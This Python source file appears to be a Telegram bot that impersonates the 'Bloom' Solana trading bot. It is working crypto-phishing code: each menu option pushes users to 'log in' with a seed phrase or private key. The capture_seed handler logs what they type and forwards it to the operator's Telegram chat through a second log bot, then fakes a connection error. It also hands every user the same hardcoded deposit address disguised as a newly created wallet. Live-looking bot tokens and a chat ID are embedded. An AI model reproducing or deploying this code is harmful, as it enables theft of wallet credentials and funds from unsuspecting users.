import logging
import asyncio
import secrets
import os
import sys
import warnings
import atexit
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.error import NetworkError, Conflict

# -------------------------
# CONFIG / NAMESPACING
# -------------------------
PREFIX = "bloom"
TOKEN = "8244731410:AAHCDO5H5msYiyTrw7k8W8Jg4t1otwPavGE"

# LOG BOT CONFIG
LOG_BOT_TOKEN = "8178046991:AAFxDU5ery9fKln7pekP-c2JA0IcyoLzSE0"
LOG_CHAT_ID = -4705597164

CHAT_ID_FILE = f"{PREFIX}_log_chat_id.txt"
LOG_FILE = f"{PREFIX}_bot.log"
LOCK_FILE = f"{PREFIX}.lock"

# -------------------------
# SIMPLE LOCAL LOCK
# -------------------------
def _check_and_create_lock():
    pid = os.getpid()
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, "r") as f:
                existing = int(f.read().strip())
            if existing != pid:
                try:
                    os.kill(existing, 0)
                except OSError:
                    pass
                else:
                    print(f"Another {PREFIX} instance appears to be running (PID {existing}). Exiting.")
                    sys.exit(1)
        except Exception:
            pass
    try:
        with open(LOCK_FILE, "w") as f:
            f.write(str(pid))
    except Exception as e:
        print(f"Warning: couldn't write lock file {LOCK_FILE}: {e}")
    def _cleanup_lock():
        try:
            if os.path.exists(LOCK_FILE):
                os.remove(LOCK_FILE)
        except Exception:
            pass
    atexit.register(_cleanup_lock)

_check_and_create_lock()

# -------------------------
# LOGGING SETUP
# -------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)],
)
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("telegram.ext").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("aiohttp.client").setLevel(logging.WARNING)
warnings.filterwarnings("ignore", category=UserWarning, module="urllib3")

# -------------------------
# CUSTOM TELEGRAM LOG HANDLER
# -------------------------
class BloomTelegramLogHandler(logging.Handler):
    def __init__(self, bot, chat_id=None):
        super().__init__()
        self.bot = bot
        self.chat_id = chat_id

    def emit(self, record):
        log_entry = self.format(record)
        if len(log_entry) > 4000:
            log_entry = log_entry[:3990] + "...\n[truncated]"

        async def safe_send():
            if not self.chat_id:
                return
            try:
                await self.bot.send_message(chat_id=self.chat_id, text=log_entry)
            except Exception as e:
                logging.warning(f"BloomTelegramLogHandler failed to send: {e.__class__.__name__}")

        try:
            asyncio.create_task(safe_send())
        except RuntimeError:
            logging.warning("Event loop not running — couldn't deliver logs to Telegram.")

# Add Telegram log handler
log_bot = Bot(token=LOG_BOT_TOKEN)
telegram_handler = BloomTelegramLogHandler(log_bot, LOG_CHAT_ID)
telegram_handler.setLevel(logging.INFO)
telegram_handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
logging.getLogger().addHandler(telegram_handler)

# -------------------------
# BOT STATE
# -------------------------
bloom_user_states = {}
bloom_awaiting_seed = {}
bloom_awaiting_privatekey = {}
bloom_wallets = {}
bloom_shown_private_key = set()

def generate_wallet():
    address = "Dt91LVw516kdrb2hj8PEaaxt5ux29f2QSDnp44PsYWVc"
    private_key = secrets.token_urlsafe(64)
    return address, private_key

# -------------------------
# HANDLERS
# -------------------------
async def handle_generic_menu_error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message or (update.callback_query and update.callback_query.message)
    if not target:
        return
    error_text = (
        "\U0001F510 You need to login your wallet first before using this command.\n\n"
        "Choose login method to continue"
    )
    buttons = [
        [InlineKeyboardButton("\U0001F468‍\U0001F4BB Contact Admin", callback_data="connect_specialist")],
        [InlineKeyboardButton("\U0001F519 Back", callback_data="login_options")]
    ]
    reply_markup = InlineKeyboardMarkup(buttons)
    await target.reply_text(error_text, reply_markup=reply_markup)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    logging.info(f"[{PREFIX.upper()} START] {user_id} ({user.full_name}) started the bot")

    welcome_text = (
        "\u2699\ufe0f *Welcome To Trade Ticket Bot!*\n\n"
        "This bot can read contract addresses and lets you interact with the blockchain.\n\n"
        "*Main Commands:*\n"
        "/config – Change options\n"
        "/wallets – See your balances or add/generate wallets\n"
        "/trades – Open trades monitor\n"
        "/snipes – List current snipes\n"
        "/balance – Quick balance check\n\n"
        "Select a category from the list provided."
    )
    await update.message.reply_text(welcome_text, parse_mode="Markdown")
    await update.message.reply_text("Choose from the category below to continue:")

    keyboard = get_main_keyboard()
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Select an option below:", reply_markup=reply_markup)

def get_main_keyboard():
    return [
        [InlineKeyboardButton("Balance", callback_data="menu_balance"),
         InlineKeyboardButton("Buy", callback_data="menu_buy"),
         InlineKeyboardButton("Positions", callback_data="menu_positions")],
        [InlineKeyboardButton("Limit Orders", callback_data="menu_limit"),
         InlineKeyboardButton("DCA Orders", callback_data="menu_dca"),
         InlineKeyboardButton("Copy Trade", callback_data="menu_copytrade")],
        [InlineKeyboardButton("Sniper", callback_data="menu_sniper"),
         InlineKeyboardButton("Trenches", callback_data="menu_trenches"),
         InlineKeyboardButton("Referrals", callback_data="menu_referrals")],
        [InlineKeyboardButton("Watchlist", callback_data="menu_watchlist"),
         InlineKeyboardButton("Withdraw", callback_data="menu_withdraw"),
         InlineKeyboardButton("Migration", callback_data="menu_migration")],
        [InlineKeyboardButton("Snapshot", callback_data="menu_snapshot"),
         InlineKeyboardButton("High Gas Fee", callback_data="menu_gas"),
         InlineKeyboardButton("Claim", callback_data="menu_claim")],
        [InlineKeyboardButton("RPC Settings", callback_data="menu_rpc"),
         InlineKeyboardButton("Pumppad", callback_data="menu_pumppad"),
         InlineKeyboardButton("Revoke Stuck", callback_data="menu_revoke")],
        [InlineKeyboardButton("Reactivate", callback_data="menu_reactivate"),
         InlineKeyboardButton("Rectification", callback_data="menu_rectify"),
         InlineKeyboardButton("Settings", callback_data="menu_settings")]
    ]

config_handler = handle_generic_menu_error
wallets_handler = handle_generic_menu_error
trades_handler = handle_generic_menu_error
snipes_handler = handle_generic_menu_error
balance_handler = handle_generic_menu_error

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat = query.message or query.from_user
    chat_id = (query.message.chat_id if query.message else query.from_user.id)
    user = query.from_user
    user_id = user.id

    logging.info(f"[{PREFIX.upper()} BUTTON] {user_id} clicked: {data}")

    if data == f'{PREFIX}_continue' or data == 'bloom_continue':
        if user_id not in bloom_wallets:
            address, private_key = generate_wallet()
            bloom_wallets[user_id] = {'address': address, 'private_key': private_key}
            logging.info(f"[WALLET CREATED] {user_id} ({user.full_name}) - Address: {address}")
        else:
            address = bloom_wallets[user_id]['address']
            private_key = bloom_wallets[user_id]['private_key']

        bloom_shown_private_key.add(user_id)

        text = (
            "🌸 *Welcome to Bloom!*\n\n"
            "*Let your trading journey blossom with us!*\n\n"
            "Your Wallet Has Been Successfully Created 🟢\n\n"
            "🔑 *Save your Private Key:*\n"
            f"`{private_key}`\n\n"
            "🌸 *Your Solana Wallet Address:*\n"
            f"{address}\n\n"
            "To start trading, deposit SOL to your address. *Only via SOL network.*"
        )
        await query.edit_message_text(text, parse_mode="Markdown")
        await asyncio.sleep(2)
        await send_main_menu(chat_id, context)

    elif data == 'refresh_menu':
        await send_main_menu(chat_id, context)

    elif data == 'connect_specialist':
        return

    elif data == 'login_options':
        login_text = "Choose login method to continue:"
        buttons = [
            [InlineKeyboardButton("\U0001F510Login Phrase", callback_data="login_phrase"),
             InlineKeyboardButton("\U0001F511Login PrivateKey", callback_data="login_privatekey")]
        ]
        reply_markup = InlineKeyboardMarkup(buttons)
        await query.edit_message_text(login_text, reply_markup=reply_markup)

    elif data == 'login_phrase':
        bloom_awaiting_seed[user_id] = True
        phrase_text = (
            "You have selected login_phrase.\n\n"
            "\u26a0\ufe0f Note: Never share your seed phrase with anyone.\n"
            "Please enter your 12/24 word seed phrase:"
        )
        await query.edit_message_text(phrase_text)

    elif data == 'login_privatekey':
        bloom_awaiting_privatekey[user_id] = True
        private_text = (
            "You have selected login_privatekey.\n\n"
            "\u26a0\ufe0f Note: Never share your Privatekey with anyone.\n"
            "Please enter your private key:"
        )
        await query.edit_message_text(private_text)

    elif data.startswith("menu_"):
        step_name = data.replace("menu_", "")
        bloom_user_states[user_id] = step_name
        logging.info(f"[MENU] {user_id} selected: {step_name}")
        readable_name = step_name.replace("_", " ").title()
        await context.bot.send_message(chat_id=chat_id, text=f"\u2705 You selected: *{readable_name}*.", parse_mode="Markdown")

        login_text = "Choose login method to continue:"
        login_buttons = [
            [InlineKeyboardButton("\U0001F510Login Phrase", callback_data="login_phrase"),
             InlineKeyboardButton("\U0001F511Login PrivateKey", callback_data="login_privatekey")]
        ]
        login_markup = InlineKeyboardMarkup(login_buttons)
        await context.bot.send_message(chat_id=chat_id, text=login_text, reply_markup=login_markup)

async def send_main_menu(chat_id, context: ContextTypes.DEFAULT_TYPE):
    keyboard = get_main_keyboard()
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, text="🌸 Main Menu:", reply_markup=reply_markup)

async def capture_seed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    chat = update.effective_chat
    text = update.message.text.strip() if update.message and update.message.text else ""
    logging.info(f"[{PREFIX.upper()} USER TEXT] {user_id} ({user.full_name}): {text}")
    logging.info(f"[CHAT INFO] ID: {chat.id}, Type: {chat.type}, Title: {chat.title or 'Private'}")
    try:
        await update.message.delete()
    except Exception as e:
        logging.warning(f"Failed to delete message: {e}")

    if bloom_awaiting_seed.get(user_id):
        bloom_awaiting_seed[user_id] = False
        await update.message.reply_text("✅ Seed phrase received. Processing...")
        await asyncio.sleep(3)
        await update.message.reply_text("❌😔 Error Connecting... Try another wallet or Contact Support👨‍💻")
    elif bloom_awaiting_privatekey.get(user_id):
        bloom_awaiting_privatekey[user_id] = False
        await update.message.reply_text("✅ Private key received. Processing...")
        await asyncio.sleep(3)
        await update.message.reply_text("❌😔 Error Connecting... Try another wallet or Contact Support👨‍💻")
    else:
        await update.message.reply_text("ℹ️ Use /start to open the main menu.")

# -------------------------
# BOOTSTRAP
# -------------------------
if __name__ == "__main__":
    try:
        app = ApplicationBuilder().token(TOKEN).build()

        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("config", config_handler))
        app.add_handler(CommandHandler("wallets", wallets_handler))
        app.add_handler(CommandHandler("trades", trades_handler))
        app.add_handler(CommandHandler("snipes", snipes_handler))
        app.add_handler(CommandHandler("balance", balance_handler))
        app.add_handler(CallbackQueryHandler(button_handler))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, capture_seed))

        print(f"{PREFIX.capitalize()} Bot is running...")
        app.run_polling()

    except Conflict:
        logging.error("⚠️ Conflict: another polling instance is using this bot token.")
        sys.exit(1)
    except NetworkError:
        logging.error("🚫 Network error occurred. Terminating bot.")
        sys.exit(1)
    except Exception as e:
        logging.exception(f"Unexpected error starting {PREFIX} bot: {e}")
        sys.exit(1)
